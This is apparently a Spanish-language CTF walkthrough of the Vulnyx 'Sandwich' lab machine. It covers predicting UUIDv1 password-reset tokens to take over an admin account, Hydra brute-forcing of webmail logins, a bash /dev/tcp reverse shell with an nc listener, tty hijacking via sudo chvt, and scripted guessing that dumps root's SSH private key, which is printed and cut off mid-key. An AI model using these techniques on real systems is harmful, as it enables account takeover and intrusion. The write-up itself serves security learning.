---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Sandwich Vulnyx (Intermediate - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 09:51 EDT
Nmap scan report for 192.168.5.79
Host is up (0.0010s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 4d:30:db:f3:d0:b5:b2:65:8d:3b:08:dc:56:2b:28:b9 (ECDSA)
|_  256 16:9f:f2:7f:ca:5a:a2:03:65:9e:f1:09:ae:15:f7:8b (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Sandwich.nyx | Your Favorite Sandwiches!
MAC Address: 08:00:27:79:76:56 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.43 seconds
```

Veremos el puerto `80` levantado que suele alojar una pagina web, si entramos dentro del mismo veremos una pagina web normal, pero en el titulo de la pagina vemos que hace referencia a un `dominio` por lo que vamos añadirlo a nuestro archivo `hosts` por si acaso.

```shell
nano /etc/hosts

#Dentro del nano

<IP>             sandwich.nyx
```

Lo guardamos y entramos con dicho `dominio`.

```
URL = http://sandwich.nyx/
```

Seguiremos viendo lo mismo, pero para futuros recursos web puede ser que nos haga falta.

Vamos a realizar un poco de `fuzzing` en dicha pagina.

## Gobuster

```shell
gobuster dir -u http://sandwich.nyx/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sandwich.nyx/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 7845]
/img                  (Status: 200) [Size: 2163]
/download.php         (Status: 200) [Size: 58]
/.php                 (Status: 403) [Size: 277]
/logout.php           (Status: 200) [Size: 7845]
/vendor               (Status: 200) [Size: 0]
/config.php           (Status: 200) [Size: 0]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/resetpassword.php    (Status: 200) [Size: 361]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos varias cosas interesantes, pero en ninguna asi podremos entrar sin autenticacion, vemos en la pagina una seccion para resetear la contraseña muy interesante que nos pueda servir en un futuro, pero despues de estar realizando muchas pruebas con `BurpSuite` para ver como funciona la peticion a nivel interno, descubri que hay un `email` llamado `admin@sandwich.nyx` ya que si intentas loguearte te pondra `password incorrect` por lo que existe, pero no nos servira de mucho.

Vamos a realizar un poco de `fuzzing` a nivel de `subdominios` a ver que vemos.

## FFUF

```shell
ffuf -c -w <WORDLIST> -u http://sandwich.nyx -H "Host: FUZZ.sandwich.nyx" -fs 7845
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sandwich.nyx
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.sandwich.nyx
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7845
________________________________________________

webmail                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 570ms]
:: Progress: [20469/20469] :: Job [1/1] :: 81 req/sec :: Duration: [0:05:28] :: Errors: 0 ::
```

Veremos que hemos encontrado una coincidencia llamada `webmail` por lo que vamos añadirla a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano

<IP>              sandwich.nyx webmail.sandwich.nyx
```

Lo guardamos y nos metemos en dicho `subdominio`.

```
URL = http://webmail.sandwich.nyx/
```

Veremos que nos carga una interfaz de un `login`, podremos registrarnos para que dicho correo se quede registrado en la `DDBB` de la pagina y posteriormente registrarnos en la web principal.

Una vez que nos registremos veremos que estamos en otra pagina con nuestra bandeja de entrada cuando iniciamos sesion.

Vamos a irnos a la pagina principal y registrar un usuario con dicho correo que ya existe, echo esto, vamos a realizar un `logout` para cerrar sesion y vamos a irnos a la seccion llamado `reset password`, ahi metemos nuestro correo paar ver que pasa de forma interna todo esto, echo eso veremos un mensaje asi:

```
Password reset link has been sent to your email.
```

Si nos vamos al `subdominio` llamado `webmail` dentro de nuestra bandeja de entrada veremos algo asi:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-14 162637.png" alt=""><figcaption></figcaption></figure>

Vemos como funciona por dentro y varias cosas interesantes, entre ellas ya sabemos el `email` desde el que lo esta enviando `web@sandeich.nyx`, tambien si enviamos unos cuantos `tokens` veremos una particularidad especial, es que si enviamos varios tokens al mismo tiempo rapidamente los `octetos` del medio y del final no cambian, pero los primeros si, tambien vemos que no expira, por lo que si enviamos un token a nosotros, otro al `admin` y de nuevo a nosotros podremos saber la franja de octetos que hay entre medias para realizar fuerza bruta por `token`.

Vamos a realizar los envios de `token` lo mas rapido posible para que no varie mucho de uno a otro.

```shell
curl -X POST http://sandwich.nyx/index.php -d "email=<USER>@sandwich.nyx" -d "reset_action=1" & curl -X POST http://sandwich.nyx/index.php -d "email=admin@sandwich.nyx" -d "reset_action=1" & curl -X POST http://sandwich.nyx/index.php -d "email=<USER>@sandwich.nyx" -d "reset_action=1"
```

Vamos a realizar eso, una vez que hayamos realizado los envios de `tokens` al `resetear` la "password", veremos en nuestro `email` estos `tokens`:

```
Primero = 2053bbd6-792f-11f0-8069-080027197fe7
Ultimo = 2055700c-792f-11f0-8069-080027197fe7
```

> createTOKENS.py

```python
#!/usr/bin/python3

def generar_uuids_por_lotes(start_hex, end_hex, batch_size=100_000, output_file="uuids.txt"):
    time_mid = "792f"
    time_hi_and_version = "11f0"
    clock_seq = "8069"
    node = "080027197fe7"

    start = int(start_hex, 16)
    end = int(end_hex, 16)

    with open(output_file, "w") as f:
        if start <= end:  # Ascendente
            step = batch_size
            for batch_start in range(start, end + 1, step):
                batch_end = min(batch_start + step, end + 1)
                for time_low in range(batch_start, batch_end):
                    time_low_hex = f"{time_low:08x}"
                    uuid_str = f"{time_low_hex}-{time_mid}-{time_hi_and_version}-{clock_seq}-{node}"
                    f.write(uuid_str + "\n")
                print(f"Lote {batch_start:08x}-{batch_end - 1:08x} guardado.")
        else:  # Descendente
            step = batch_size
            for batch_start in range(start, end - 1, -step):
                batch_end = max(batch_start - step, end - 1)
                for time_low in range(batch_start, batch_end, -1):
                    time_low_hex = f"{time_low:08x}"
                    uuid_str = f"{time_low_hex}-{time_mid}-{time_hi_and_version}-{clock_seq}-{node}"
                    f.write(uuid_str + "\n")
                print(f"Lote {batch_start:08x}-{batch_end + 1:08x} guardado.")

# Llamada a la función
generar_uuids_por_lotes("2053bbd6", "2055700c")
```

Ahora lo vamos a probar de esta forma:

```shell
python3 createTOKENS.py
```

Con esto habremos creado la lista, vamos a probarla con `FFUF` que es mas rapido que con `python3`.

```shell
ffuf -u "http://sandwich.nyx/resetpassword.php" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "token=FUZZ&new_password=diseo&confirm_password=diseo" -w uuids.txt -fs 420
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://sandwich.nyx/resetpassword.php
 :: Wordlist         : FUZZ: /home/kali/Desktop/sandwich/uuids.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : token=FUZZ&new_password=diseo&confirm_password=diseo
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 420
________________________________________________

2053bbd6-792f-11f0-8069-080027197fe7 [Status: 200, Size: 408, Words: 57, Lines: 16, Duration: 1441ms]
2053dc88-792f-11f0-8069-080027197fe7 [Status: 200, Size: 408, Words: 57, Lines: 16, Duration: 7307ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Veremos que ha funcionado, en el codigo pusimos como `password` el nombre `diseo` vamos a ver si ha funcionado.

Llendonos a la pagina principal y dandole a `login` pondremos las actuales credenciales:

```
Email = admin@sandwich.nyx
Pass = diseo
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-14 185605.png" alt=""><figcaption></figcaption></figure>

Y veremos que estamos dentro de forma exitosa, por lo que vamos a darle a `Download saved Sandwiches`, esto nos descargara un `sandwiches.csv` lo que parece que puede llevar credenciales, por lo que vamos abrirlo.

```csv
Email,Bread,Ingredients,Sauces,"Created At"
ll104567_9q@sandwich.nyx,"Whole Wheat","Ham,Cheese,Tomato",Mustard,"2025-03-30 19:04:31"
suraxddq_tw@sandwich.nyx,White,"Ham,Cheese,Lettuce,Tomato","Mayonnaise,Ketchup","2025-03-30 19:04:56"
xerosec_w5@sandwich.nyx,Rye,"Cheese,Lettuce",Mustard,"2025-03-30 19:05:19"
j4ckie_x5@sandwich.nyx,"Whole Wheat","Cheese,Lettuce,Tomato","Mayonnaise,Mustard,Ketchup","2025-03-30 19:05:52"
matthygd_x@sandwich.nyx,"Whole Wheat","Cheese,Lettuce","Mayonnaise,Mustard","2025-03-30 19:07:19"
```

Vemos varios usuarios de correos, por lo que podriamos probar a realizar un poco de `fuerza bruta` a ver si conseguimos algo.

## Escalate user matthygd\_xy

> users.txt

```
ll104567_9q@sandwich.nyx
suraxddq_tw@sandwich.nyx
xerosec_w5@sandwich.nyx
j4ckie_x5@sandwich.nyx
matthygd_x@sandwich.nyx
```

Con el listado de usuarios vamos a realizar fuerza bruta.

### Hydra

```shell
hydra -L users.txt -P <WORDLIST> webmail.sandwich.nyx http-post-form "/login.php:email=^USER^&password=^PASS^:Invalid credentials or user not found." -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-15 03:58:06
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://webmail.sandwich.nyx:80/login.php:email=^USER^&password=^PASS^:Invalid credentials or user not found.
[STATUS] 375.00 tries/min, 375 tries in 00:01h, 14344024 to do in 637:31h, 64 active
[STATUS] 351.67 tries/min, 1055 tries in 00:03h, 14343344 to do in 679:47h, 64 active
[STATUS] 360.57 tries/min, 2524 tries in 00:07h, 14341875 to do in 662:56h, 64 active
[80][http-post-form] host: webmail.sandwich.nyx   login: matthygd_x@sandwich.nyx   password: qweasd
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-15 04:06:24
```

Veremos que hemos encontrado las credenciales, por lo que vamos a `loguearnos` en `webmail`.

```
User: matthygd_x@sandwich.nyx
Pass: qweasd
```

Si entramos dentro veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-15 100916.png" alt=""><figcaption></figcaption></figure>

Vemos que nos esta dando unas credenciales para conectarnos por `SSH` por lo que vamos a coenctarnos.

### SSH

```shell
ssh matthygd_xy@<IP>
```

Metemos como contraseña `tGCD9XIP03IHpSCDdoRu`...

Info:

```
Linux sandwich 6.1.0-32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.129-1 (2025-03-06) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 30 19:35:02 2025 from 192.168.1.181
matthygd_xy@sandwich:~$ whoami
matthygd_xy
```

Con esto veremos que ya estaremos dentro por lo que leeremos la `flag` del usuario.

> user.txt

```
c158efefab9bfd356fa8e9ec3c440da1
```

## Escalate user ll104567

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for matthygd_xy on sandwich:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User matthygd_xy may run the following commands on sandwich:
    (root) NOPASSWD: /bin/chvt
```

Veremos que podemos ejecutar el binario `chvt` como el usuario `root` por lo que podremos realizar lo siguiente:

Sabemos que con ese binario se puede cambiar a una terminal virtual por asi decirlo, si listamos las `tty` que hay en el sistema veremos algo interesante:

```shell
ls -l /dev/tty[0-9] /dev/tty[0-9][0-9] 2>/dev/null
```

Info:

```
..............................<RESTO DE CODIGO>...................................
crw------- 1 ll104567 tty 4, 20 ago 15 09:13 /dev/tty20
..............................<RESTO DE CODIGO>...................................
```

Vemos que esta `tty` esta con el usuario `ll104567` por lo que ya nos esta dando una pista de lo que podremos hacer.

Pero para invocar una `tty` virtual tendremos que ir al equipo "fisico" como tal, que en nuestro caso seria la maquina victima como tal, tendremos que iniciar sesion con el usuario `matthygd_xy` e invocamos dicha `tty`.

Una vez que invoquemos la `tty`:

```shell
sudo /bin/chvt 20
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-15 103448.png" alt=""><figcaption></figcaption></figure>

Ahora nos vamos a realizar una `reverse shell` para tener una `TTY` sanitizada.

```shell
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Antes de enviarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos lo anterior y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.80] 56780
ll104567@sandwich:~$ whoami
whoami
ll104567
```

Vamos a sanitizar la `TTY` de esta forma:

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for ll104567 on sandwich:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ll104567 may run the following commands on sandwich:
    (ALL) NOPASSWD: /opt/game.sh
```

Veremos que podremos ejecutar el script `game.sh` como el usuario `root`, por lo que vamos a leer a ver que hace dicho `script`.

```bash
#!/bin/bash

export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

MAX=2000000

ATTEMPTS=$(/usr/bin/awk -v max="$MAX" 'BEGIN {printf "%d", (log(max)/log(2) + 0.999999)}')

/bin/echo "Hello! What is your name?"
read NAME

NUMBER=$(( ( RANDOM % MAX ) + 1 ))

/bin/echo "Well, $NAME, I'm thinking of a number between 1 and $MAX."
/bin/echo "You have $ATTEMPTS attempts to guess it."

ATTEMPTS_MADE=0

SECRET_FILE="/root/.ssh/id_rsa"

while [ $ATTEMPTS_MADE -lt $ATTEMPTS ]; do
  /bin/echo "Try to guess:"
  read GUESS

  # Validate that the input is a valid number
  if ! [[ "$GUESS" =~ ^[0-9]+$ ]]; then
    /bin/echo "Please, enter a valid number."
    continue
  fi

  ATTEMPTS_MADE=$((ATTEMPTS_MADE + 1))

  if [ $GUESS -lt $NUMBER ]; then
    /bin/echo "Your guess is too low."
  elif [ $GUESS -gt $NUMBER ]; then
    /bin/echo "Your guess is too high."
  else
    break
  fi
done

if [ $GUESS -eq $NUMBER ]; then
  /bin/echo "Good job, $NAME! You guessed my number in $ATTEMPTS_MADE attempts!"
  /bin/echo "Here's your reward:"
  /bin/cat "$SECRET_FILE"
else
  /bin/echo "No, the number I was thinking of was $NUMBER."
fi
```

Veremos que es como un juego, si adivinamos el numero correcto que es aleatorio nos porporcionara la clave `privada` de `root`, por lo que vamos a montarnos un `script` para poder adivinarlo de forma mas rapida.

> number.py

```bash
#!/usr/bin/env python3
import subprocess
import re

low = 1
high = 2_000_000

while True:
    proc = subprocess.Popen(
        ["sudo", "/opt/game.sh"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    reading_reward = False

    while True:
        line = proc.stdout.readline()
        if not line:
            break

        line = line.rstrip()
        print(line)  # Mostramos todo lo que se imprime

        if reading_reward:
            # Todo lo que llegue después de acertar
            print("REWARD:", line)
            continue

        if "What is your name" in line:
            proc.stdin.write("player\n")
            proc.stdin.flush()
            continue

        if "You have" in line and "attempts" in line:
            m = re.search(r'\d+', line)
            if m:
                attempts_left = int(m.group())
            continue

        if "Try to guess:" in line:
            guess = (low + high) // 2
            proc.stdin.write(f"{guess}\n")
            proc.stdin.flush()
            continue

        if "too high" in line:
            high = guess - 1
        elif "too low" in line:
            low = guess + 1
        elif "Good job" in line:
            print("¡Número adivinado!")
            reading_reward = True  # A partir de ahora, todo es la recompensa
        elif "No, the number I was thinking of was" in line:
            low = 1
            high = 2_000_000
            break
```

Ahora lo vamos a ejecutar de esta forma:

```shell
chmod +x number.py
./number.py
```

Info:

```
............................<RESTO DE CODIGO>......................................
Good job, player! You guessed my number in 20 attempts!
¡Número adivinado!
Here's your reward:
REWARD: Here's your reward:
-----BEGIN OPENSSH PRIVATE KEY-----
REWARD: -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
REWARD: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAzMoVFzc2RXwrRJ6QA2Kr/trjNxtTpuvKn10uYGmFNcmPfACQfR0H
REWARD: NhAAAAAwEAAQAAAgEAzMoVFzc2RXwrRJ6QA2Kr/trjNxtTpuvKn10uYGmFNcmPfACQfR0H
BBWQUY8LvVg+5UGGEyuC1Kvv9hevyemqVMm5+Xe9D+BCHQoqXoa7VeEd+As736w9+Ly1/D
REWARD: BBWQUY8LvVg+5UGGEyuC1Kvv9hevyemqVMm5+Xe9D+BCHQoqXoa7VeEd+As736w9+Ly1/D
z0ovVAA1Ae8eRJsHzXHLFcgXflpOh2mdH7hAnzr3sbDFSnUT7VOy86ODMm1PFfC6ec5BjU
REWARD: z0ovVAA1Ae8eRJsHzXHLFcgXflpOh2mdH7hAnzr3sbDFSnUT7VOy86ODMm1PFfC6ec5BjU
z5iQjdHGOpOOTxvAsMIQeZWCgR1/hrnB1LgT82eKakFerk1V1bJTGCqDpOeaVY/oOwTXIX
REWARD: z5iQjdHGOpOOTxvAsMIQeZWCgR1/hrnB1LgT82eKakFerk1V1bJTGCqDpOeaVY/oOwTXIX
gLOQ/jFzExmTy7H8PpOsr4QdkKdpLaerCE3Mz56muJKxcI30jgSXficKTgPh9dbbgSm+6U
REWARD: gLOQ/jFzExmTy7H8PpOsr4QdkKdpLaerCE3Mz56muJKxcI30jgSXficKTgPh9dbbgSm+6U
5idrOsVHhs72xLGQZFpLD88MZhGK92WN5KPrHAIltpm6Jn8wy+znOwdeenLe9XGqCBuk/f
REWARD: 5idrOsVHhs72xLGQZFpLD88MZhGK92WN5KPrHAIltpm6Jn8wy+znOwdeenLe9XGqCBuk/f
rjbEGtBwCjgM0s9l/4chymXNIMfB84PXHbZIQKpMx2cwjni8CQ9n7yJWxVzNcxQPO6Ft9h
REWARD: rjbEGtBwCjgM0s9l/4chymXNIMfB84PXHbZIQKpMx2cwjni8CQ9n7yJWxVzNcxQPO6Ft9h
cxWVwiGYqsAJEiQUjgRH5amveLLvpeccI+NqbEMsxn/T+GA1pKUvmvI9qUNK30T5HxGzGm
REWARD: cxWVwiGYqsAJEiQUjgRH5amveLLvpeccI+NqbEMsxn/T+GA1pKUvmvI9qUNK30T5HxGzGm
3mEfcXqL+EGmzTuiMFKRdLLcqp455WG+uKduDZbzRDmbEC4GKAKg5qIwe+YXw1wYzb6uEx
REWARD: 3mEfcXqL+EGmzTuiMFKRdLLcqp455WG+uKduDZbzRDmbEC4GKAKg5qIwe+YXw1wYzb6uEx
2Lx9QHdMiKYpEg+uEJF3jpr+i7YJ4rDX3/dwMQs+r26NxmC12wSKrqkUIYRZeo+KBxm+LD
REWARD: 2Lx9QHdMiKYpEg+uEJF3jpr+i7YJ4rDX3/dwMQs+r26NxmC12wSKrqkUIYRZeo+KBxm+LD
0AAAdIn9Yut5/WLrcAAAAHc3NoLXJzYQAAAgEAzMoVFzc2RXwrRJ6QA2Kr/trjNxtTpuvK
REWARD: 0AAAdIn9Yut5/WLrcAAAAHc3NoLXJzYQAAAgEAzMoVFzc2RXwrRJ6QA2Kr/trjNxtTpuvK
n10uYGmFNcmPfACQfR0HBBWQUY8LvVg+5UGGEyuC1Kvv9hevyemqVMm5+Xe9D+BCHQoqXo
REWARD: n10uYGmFNcmPfACQfR0HBBWQUY8LvVg+5UGGEyuC1Kvv9hevyemqVMm5+Xe9D+BCHQoqXo
a7VeEd+As736w9+Ly1/Dz0ovVAA1Ae8eRJsHzXHLFcgXflpOh2mdH7hAnzr3sbDFSnUT7V
REWARD: a7VeEd+As736w9+Ly1/Dz0ovVAA1Ae8eRJsHzXHLFcgXflpOh2mdH7hAnzr3sbDFSnUT7V
Oy86ODMm1PFfC6ec5BjUz5iQjdHGOpOOTxvAsMIQeZWCgR1/hrnB1LgT82eKakFerk1V1b
REWARD: Oy86ODMm1PFfC6ec5BjUz5iQjdHGOpOOTxvAsMIQeZWCgR1/hrnB1LgT82eKakFerk1V1b
JTGCqDpOeaVY/oOwTXIXgLOQ/jFzExmTy7H8PpOsr4QdkKdpLaerCE3Mz56muJKxcI30jg
REWARD: JTGCqDpOeaVY/oOwTXIXgLOQ/jFzExmTy7H8PpOsr4QdkKdpLaerCE3Mz56muJKxcI30jg
SXficKTgPh9dbbgSm+6U5idrOsVHhs72xLGQZFpLD88MZhGK92WN5KPrHAIltpm6Jn8wy+
REWARD: SXficKTgPh9dbbgSm+6U5idrOsVHhs72xLGQZFpLD88MZhGK92WN5KPrHAIltpm6Jn8wy+
znOwdeenLe9XGqCBuk/frjbEGtBwCjgM0s9l/4chymXNIMfB84PXHbZIQKpMx2cwjni8CQ
REWARD: znOwdeenLe9XGqCBuk/frjbEGtBwCjgM0s9l/4chymXNIMfB84PXHbZIQKpMx2cwjni8CQ
9n7yJWxVzNcxQPO6Ft9hcxWVwiGYqsAJEiQUjgRH5amveLLvpeccI+NqbEMsxn/T+GA1pK
REWARD: 9n7yJWxVzNcxQPO6Ft9hcxWVwiGYqsAJEiQUjgRH5amveLLvpeccI+NqbEMsxn/T+GA1pK
UvmvI9qUNK30T5HxGzGm3mEfcXqL+EGmzTuiMFKRdLLcqp455WG+uKduDZbzRDmbEC4GKA
REWARD: UvmvI9qUNK30T5HxGzGm3mEfcXqL+EGmzTuiMFKRdLLcqp455WG+uKduDZbzRDmbEC4GKA
Kg5qIwe+YXw1wYzb6uEx2Lx9QHdMiKYpEg+uEJF3jpr+i7YJ4rDX3/dwMQs+r26NxmC12w
REWARD: Kg5qIwe+YXw1wYzb6uEx2Lx9QHdMiKYpEg+uEJF3jpr+i7YJ4rDX3/dwMQs+r26NxmC12w
SKrqkUIYRZeo+KBxm+LD0AAAADAQABAAACABTh6HD+bs4lbBi/syoSi5Jd31Hfu1HSn833
REWARD: SKrqkUIYRZeo+KBxm+LD0AAAADAQABAAACABTh6HD+bs4lbBi/syoSi5Jd31Hfu1HSn833
XQLKJSIdJGtTIr4MpzSp6ZZU0rAjSaqWr2V7XYhyjfIXa+lYJp0lwuKRl1mr7GH0sZRZAy
REWARD: XQLKJSIdJGtTIr4MpzSp6ZZU0rAjSaqWr2V7XYhyjfIXa+lYJp0lwuKRl1mr7GH0sZRZAy
JYkHXvg1Klct5PM/QoLRQEPoZNSxKEd7qDncCDGiPo8NBg6gh5FT+GGkTDILjLAGge/Z8J
REWARD: JYkHXvg1Klct5PM/QoLRQEPoZNSxKEd7qDncCDGiPo8NBg6gh5FT+GGkTDILjLAGge/Z8J
i6jDwopv9dlaOqaMclWcQOVNRlGeeUz6JKssPCzXFkCJ8avwe4zwRmHe0DT8kdCOpJmOvm
REWARD: i6jDwopv9dlaOqaMclWcQOVNRlGeeUz6JKssPCzXFkCJ8avwe4zwRmHe0DT8kdCOpJmOvm
gWRxKaPAPMkbRETpb5nD9cg4jPueHeg6r+DxAxNqEppiZS3EIq3NQnzLY0R/+jsNe/9oBX
REWARD: gWRxKaPAPMkbRETpb5nD9cg4jPueHeg6r+DxAxNqEppiZS3EIq3NQnzLY0R/+jsNe/9oBX
YA5M1GxRRiApkdriYxRDDG1Tmkg8q7LeAnx4EGFCJJigVIFjVnQ9GNADzx0rNQtFfNVDdM
REWARD: YA5M1GxRRiApkdriYxRDDG1Tmkg8q7LeAnx4EGFCJJigVIFjVnQ9GNADzx0rNQtFfNVDdM
/ORCD4s0PzGh5rrxtjl3JeWMR5R1Q4e423HODTNo0k6arLOTcQyMiDrV4Oxgl1AbEKvkyB
REWARD: /ORCD4s0PzGh5rrxtjl3JeWMR5R1Q4e423HODTNo0k6arLOTcQyMiDrV4Oxgl1AbEKvkyB
ya1Rin+wy3UnsYR6K2gkrDQ8dzGyw2tAIg8cpKZDeJQi6t3uQw/miQDkPcLBC0dyuP7Hjr
REWARD: ya1Rin+wy3UnsYR6K2gkrDQ8dzGyw2tAIg8cpKZDeJQi6t3uQw/miQDkPcLBC0dyuP7Hjr
wPvh87Z5FcHfFQyx7A+sy87H79Fv4vGJGUyLNeczf2cpje83ISLgCenxZmoAiZw9ubgoqU
REWARD: wPvh87Z5FcHfFQyx7A+sy87H79Fv4vGJGUyLNeczf2cpje83ISLgCenxZmoAiZw9ubgoqU
8O0FDDLAMja/O9f2ULatRHYeVkew/A36+JJyLrwjkL9oIbYZSSsNm7kr80SbvC06pxMsT2
REWARD: 8O0FDDLAMja/O9f2ULatRHYeVkew/A36+JJyLrwjkL9oIbYZSSsNm7kr80SbvC06pxMsT2
gsHksMsMqfjlEEjl+bAAABAQC441IN9GF2S8t2GzwMQtrf+DuaAqUuBHsdQ1oL4Z+oXxXV
REWARD: gsHksMsMqfjlEEjl+bAAABAQC441IN9GF2S8t2GzwMQtrf+DuaAqUuBHsdQ1oL4Z+oXxXV
81nEB2tpzNcoFXdr5YCJoa7wqcsHWJ17efSn75V5eKupQcw5R3qFObUoWOHwXqHMr3MAj5
REWARD: 81nEB2tpzNcoFXdr5YCJoa7wqcsHWJ17efSn75V5eKupQcw5R3qFObUoWOHwXqHMr3MAj5
nupQo7YqWmXVYZU6qqob6BSWK7QGSMhH3lTOpr0Tmzyj+VeUJ5jpTH8yupsbYdvoufPb4w
REWARD: nupQo7YqWmXVYZU6qqob6BSWK7QGSMhH3lTOpr0Tmzyj+VeUJ5jpTH8yupsbYdvoufPb4w
a917NJxEatNyH/Pb1+qF9ZaK/QkYEuWO63pIBnQsrwIPWzG3XhLQvUsyKuzaqt/GaidY6o
REWARD: a917NJxEatNyH/Pb1+qF9ZaK/QkYEuWO63pIBnQsrwIPWzG3XhLQvUsyKuzaqt/GaidY6o
sBV4e/57CPx4/2orOPIUkJrojO39st9suBnBhWv0RB4CYeiFOFqJHg4lAHc89uh7/1FhfJ
REWARD: sBV4e/57CPx4/2orOPIUkJrojO39st9suBnBhWv0RB4CYeiFOFqJHg4lAHc89uh7/1FhfJ
qH8/93WDPQzLb1EnAAABAQDmOx0PEyd1L50bZcf/yBPTgu/E3hhJsn2EkjKNciQvf0XMqo
REWARD: qH8/93WDPQzLb1EnAAABAQDmOx0PEyd1L50bZcf/yBPTgu/E3hhJsn2EkjKNciQvf0XMqo
bp3xB7eSMtB2tPmlsJdKQ0pmuX1b5/Mxf5377cLVHtGefkqPH1irZMIUupJJybwQDvv1TE
REWARD: bp3xB7eSMtB2tPmlsJdKQ0pmuX1b5/Mxf5377cLVHtGefkqPH1irZMIUupJJybwQDvv1TE
I7nS3nsGgro0LxFegq4lNK/J0hOxdr0AzYCA0V1URBAc7F1yeIVsfw5agUBctTIETh4vb2
